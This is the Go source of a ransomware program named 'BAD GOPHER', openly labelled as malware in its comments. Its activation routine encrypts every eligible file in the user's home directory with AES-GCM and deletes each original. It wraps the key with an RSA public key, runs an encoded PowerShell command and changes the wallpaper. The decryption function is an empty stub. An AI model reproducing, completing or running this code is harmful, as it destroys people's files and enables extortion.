package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/faiface/beep"
	"github.com/faiface/beep/mp3"
	"github.com/faiface/beep/speaker"
	"github.com/reujab/wallpaper"
)

var magicBytes = []byte("BAD GOPHER\n")
var currentTime = []byte(time.Now().UTC().String() + "\n")

const suffix = ".gopher"

// Compresses one or many files into a single zip archive file.
// Param 1: file is a file to add to the zip.
func zipFile(filename string) ([]byte, error) {
	// Create buffer to store zipped file
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// Open file for reading
	fileToZip, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer fileToZip.Close()

	// Get the file information
	info, err := fileToZip.Stat()
	if err != nil {
		return nil, err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return nil, err
	}

	// Using FileInfoHeader() above only uses the basename of the file. If we want
	// to preserve the folder structure we can overwrite this with the full path.
	// header.Name = filename

	// Change to deflate to gain compression
	// see http://golang.org/pkg/archive/zip/#pkg-constants
	header.Method = zip.Store

	// Create writer for adding file to zip
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	// Write the file to the zip
	_, err = io.Copy(writer, fileToZip)

	zipWriter.Close()

	return buf.Bytes(), err
}

// CSPRNG random byte generator
func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)

	if err != nil {
		return nil, err
	}

	return b, nil
}

// Encryption helper function
func encrypt(data []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

// Decryption helper function
func decrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

// Encrypt file and save
func encryptFile(inputFilename string, outputFilename string, key []byte) {
	// Zip file first to preserve metadata
	zippedFile, _ := zipFile(inputFilename)
	f, _ := os.Create(outputFilename)
	defer f.Close()
	f.Write(encrypt(zippedFile, key))
}

// Decrypt file and return contents
func decryptFile(filename string, key []byte) []byte {
	data, _ := ioutil.ReadFile(filename)
	return decrypt(data, key)
}

// Malware activation routine
func activate(home string, keyFilePath string) {
	// Set wallpaper
	// TODO: save old wallpaper so it can be restored
	desktopBackgroundDec, _ := base64.StdEncoding.DecodeString(desktopBackground)
	f, _ := os.Create(home + "BAD_GOPHER.jpg")
	f.Write(desktopBackgroundDec)
	f.Close()

	// TODO: Separate encryption and decryption routines into two separate functions
	// to clean up the code

	err := wallpaper.SetFromFile(home + "BAD_GOPHER.jpg")
	if err != nil {
		fmt.Println(err)
	}

	// Special command for setting Windows wallpaper for <= Windows 7
	// EncodedCommand MUST be in UTF-16 LE encoding when encoded with base64
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-EncodedCommand", wallpaperCmdString)
		defer cmd.Start()
		defer cmd.Wait()
	}

	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")

	// Generate the symmetric AES encryption key
	key, _ := generateRandomBytes(32)

	fmt.Printf("Symmetric key: %s\n", hex.EncodeToString(key))

	pubRaw, _ := ioutil.ReadFile("pub.pem")
	pubPem, _ := pem.Decode(pubRaw)
	pubKey, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)

	// Encrypt the symmetric key with the asymmetric public key
	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)

	// Save the decryption key and other information to the disk
	keyFile, _ := os.Create(keyFilePath)
	keyFile.WriteString(hex.EncodeToString(ciphertext))
	keyFile.Close()

	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))

	// Go through every file in the starting directory and encrypt it
	filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Don't encrypt directories
		if info.IsDir() {
			if strings.ToLower(info.Name()) == "appdata" {
				return filepath.SkipDir
			}
			if strings.HasPrefix(info.Name(), ".") {
				return filepath.SkipDir
			}
			if strings.ToLower(info.Name()) == "node_modules" {
				return filepath.SkipDir
			}
			return nil
		}

		// Don't encrypt large files (>2GB)
		if info.Size() > 2000000000 {
			return nil
		}

		// Don't encrypt already encrypted files
		if strings.HasSuffix(info.Name(), suffix) {
			return nil
		}

		// Don't encrypt files that have already been encrypted
		if _, err := os.Stat(path + suffix); err == nil {
			return nil
		}

		// Don't encrypt the decryption key file
		if strings.Contains(strings.ToLower(info.Name()), "bad_gopher") {
			return nil
		}

		// Don't encrypt registry files
		if strings.Contains(strings.ToLower(info.Name()), "ntuser") {
			return nil
		}

		// Don't encrypt key files
		if strings.Contains(strings.ToLower(info.Name()), ".pem") {
			return nil
		}

		fmt.Println(path, info.Size())
		encryptFile(path, path+".gopher", key)

		// Destroy original file
		os.Remove(path)

		return nil
	})

	// Play audio
	audioDec, _ := base64.StdEncoding.DecodeString(audioData)

	// Create io.ReadCloser to stream audio from memory rather than saving file
	audioReadCloser := ioutil.NopCloser(bytes.NewReader(audioDec))
	streamer, format, err := mp3.Decode(audioReadCloser)
	if err != nil {
		log.Fatal(err)
	}
	defer streamer.Close()

	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))

	done := make(chan bool)
	speaker.Play(beep.Seq(streamer, beep.Callback(func() {
		done <- true
	})))

	<-done
}

// Malware deactivation and decryption routine
func deactivate(home string, keyFilePath string) {

}

func main() {
	// TODO: Add command-line arguments for decryption to recover files
	// Check if If Bad Gopher has already ran on the computer (seen just below).
	// If so, program should operate in decryption mode.
	// At least for Windows, dragging the decryption key file onto Bad_Gopher.exe
	// should start decryption

	home, _ := os.UserHomeDir()
	home = home + "/"
	keyFilePath := home + "BAD_GOPHER.txt"

	// Check if key file exists, if not run the program
	if _, err := os.Stat(keyFilePath); err != nil {
		activate(home, keyFilePath)
		return
	}

	// Start decryption if key file provided
	if len(os.Args) > 1 && strings.Contains(strings.ToLower(os.Args[1]), "bad_gopher_decrypt") {
		deactivate(home, keyFilePath)
		return
	}

	fmt.Println("BAD GOPHER has already been activated. No decryption key was provided.")
}
